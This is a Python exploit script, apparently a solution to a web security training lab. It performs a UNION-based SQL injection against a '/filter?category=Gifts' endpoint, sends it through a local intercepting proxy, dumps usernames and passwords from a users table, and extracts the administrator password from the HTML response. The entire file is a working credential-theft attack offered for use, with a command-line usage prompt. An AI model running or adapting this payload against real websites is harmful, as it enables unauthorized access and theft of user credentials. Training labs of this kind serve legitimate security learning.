import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Gifts'
    sqli_payload = "'+union+select+username,+password+from+users--+-"
    r = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        print("[+] Found the administrator password")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
        print("[+] administrators password is '%s'" % admin_password)
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the list of usersnames and passwords...")

    if not exploit_sqli_users_table(url):
        print("[-] Did not find an Administrator password")
